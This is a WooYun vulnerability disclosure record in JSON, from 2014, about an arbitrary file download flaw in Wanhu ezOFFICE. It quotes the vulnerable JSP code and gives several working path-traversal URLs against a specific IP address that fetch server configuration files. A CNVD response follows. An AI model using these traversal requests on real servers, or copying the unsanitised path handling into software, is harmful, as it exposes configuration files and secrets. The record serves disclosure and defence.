{"id": 1602, "wybug_id": "wooyun-2014-063711", "wybug_title": "万户ezOFFICE无限制任意文件下载", "wybug_corp": "万户", "wybug_author": "北京方便面", "wybug_date": "2014-06-06 17:46", "wybug_open_date": "2014-09-04 17:48", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向公众公开  简要描述： 万户ezOFFICE无限制任意文件下载 详细说明：  \nString filepath=\"\";  HttpServletRequest HSR=(HttpServletRequest)pageContext.getRequest();  String path=request.getParameter(\"path\");  filepath=HSR.getRealPath(\"/upload/\")+\"/\"+path+\"/\";  String filename = request.getParameter(\"FileName\");  String name = request.getParameter(\"name\");  name=new String(name.getBytes(\"GBK\"),\"iso-8859-1\");    java.io.File file = new java.io.File(filepath + filename);  if(file.exists()){\t  // 设置响应头和下载保存的文件名\t  response.setContentType(\"csv\");\t  response.setHeader(\"Content-Disposition\",\t  \"attachment; filename=\\\"\" + name + \"\\\"\");\t  // 打开指定文件的流信息\t  java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath + filename);\t  // 写出流信息\t  int i;\t  while ((i=fileInputStream.read()) != -1) {\t   out.write(i);\t  }\t  fileInputStream.close();\t  out.close();  }else{\t  response.setContentType(\"text/html; charset=GBK\");\t  %>\t  <html>      <head>      <title></title>      <meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\">\t  <SCRIPT LANGUAGE=\"JavaScript\">\t  <!--\t\talert(\"指定的文件不存在！\");\t    history.back();\n配置文件为例：http://222.178.221.54:7001/defaultroot/public/jsp/download.jsp?FileName=mailserver.properties&name=2.jsp&path=/../../config/http://222.178.221.54:7001/defaultroot/public/jsp/download.jsp?FileName=govexchange.properties&name=2.jsp&path=/../../config/http://222.178.221.54:7001/defaultroot/public/jsp/download.jsp?FileName=config.xml&name=2.jsp&path=/../../config/http://222.178.221.54:7001/defaultroot/public/jsp/download.jsp?FileName=systemMark.properties&name=2.jsp&path=/../../config/   漏洞证明：  config.xml\n\n   修复方案：     版权声明：转载请注明来源 北京方便面@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-06-11 16:41 厂商回复： CNVD确认并在多个实例上复现所述情况，已经由CNVD直接联系软件生产厂商（按以往联系处置渠道），电话至，将通报发送至zhuobq路邮箱中处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-06 17:49 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  哈哈~在库带已经提交了很多了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}